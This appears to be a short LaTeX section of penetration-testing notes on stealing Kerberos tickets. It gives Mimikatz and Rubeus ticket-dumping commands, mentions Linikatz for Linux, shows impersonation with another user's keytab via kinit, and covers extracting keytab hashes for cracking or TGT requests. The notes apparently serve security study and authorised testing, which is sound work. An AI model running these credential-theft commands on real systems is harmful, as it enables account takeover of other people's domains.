\section{Stealing Kerberos Tickets}

\subsection{Ticket conversion}
If we want to use a ccache file in Windows or a kirbi file in a Linux machine,
we can use impacket \verb+ticketConverter+ to convert them:



\subsection{On windows}

\subsubsection{Mimikatz}
Mimikatz module \verb+sekurlsa::tickets /export+. The result is a list of files
with the extension .kirbi, which contain the tickets.

Need to \verb+privilege::debug+

\subsubsection{Rubeus}

\begin{verbatim}
Rubeus.exe dump /nowrap
\end{verbatim}


\subsection{from a domain joined linux}

\href{https://github.com/CiscoCXSecurity/linikatz}{Linikatz} is a tool created
by Cisco's security team for exploiting credentials on Linux machines when
there is an integration with Active Directory. In other words, Linikatz brings
a similar principle to Mimikatz to UNIX environments.


\subsection{Abusing keytab files}

\begin{itemize}
    \item \verb+klist+: list cached Kerberos tickets
    \item \verb+kinit+: get a TGT
\end{itemize}
    

\subsubsection{Impersonation}

Simply use the keytab file of anoter user

\begin{verbatim}
# list content of a keytab file
$ klist -k -t [<file>]

# kinit <principal> -k -t <keytab file> 

# confirm
$ klist 
\end{verbatim}

\subsubsection{Extracting keytab Hashes}


\href{https://github.com/sosdave/KeyTabExtract}{KeyTabExtract}

\begin{verbatim}
$ KeyTabExtract <keytab file>
\end{verbatim}

then crack and login or generate a TGT with impacket \verb+getTGT+


